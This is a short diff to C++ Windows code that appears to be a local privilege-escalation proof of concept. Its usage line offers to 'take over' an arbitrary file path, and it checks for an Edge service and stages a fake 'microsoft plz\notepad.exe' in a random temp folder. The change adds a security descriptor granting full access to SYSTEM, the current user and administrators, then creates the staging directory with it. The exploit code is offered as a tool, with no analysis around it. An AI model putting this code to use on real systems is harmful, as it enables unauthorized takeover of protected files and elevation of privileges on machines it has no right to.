@@ -117,12 +117,19 @@ bool DoesEdgeSvcExist() {
     return true;
 }
 void PrepareGlobalInstallDir() {
-
+    WCHAR string_sd[512] = L"D:PAI(A;OICI;FA;;;SY)(A;OICI;FA;;;\0";
+    StringCchCat(string_sd, 512, _GetUserSid());
+    StringCchCat(string_sd, 512, L")(A;OICI;FA;;;BA)\0");
+    PSECURITY_DESCRIPTOR sd = new SECURITY_DESCRIPTOR;
+    ULONG sd_sz = 0;
+    ConvertStringSecurityDescriptorToSecurityDescriptor(string_sd, SDDL_REVISION_1, &sd, &sd_sz);
+    SECURITY_ATTRIBUTES sa = { sizeof(sa), sd, FALSE };
     WCHAR _tmp[MAX_PATH] = L"%TEMP%\\";
     StringCchCat(_tmp, MAX_PATH, op.GenerateRandomStr().c_str());
     ExpandEnvironmentStrings(_tmp, GlobalInstallDir, MAX_PATH);
     WCHAR ntpd[MAX_PATH];
     wcscpy_s(ntpd, GlobalInstallDir);
+    SHCreateDirectoryEx(NULL, ntpd, &sa);
     StringCchCat(ntpd, MAX_PATH, L"\\microsoft plz");
     SHCreateDirectory(NULL, ntpd);
     StringCchCat(ntpd, MAX_PATH, L"\\notepad.exe");
@@ -355,6 +362,7 @@ bool IsFileWriteAble(WCHAR* f) {
 
 int wmain(int argc, wchar_t *argv[])
 {
+
     if (!DoesEdgeSvcExist() && (argc != 2)) {
         wprintf(L"[#] Usage : %s C:\\File\\To\\Take\\Over", argv[0]);
         return 0;
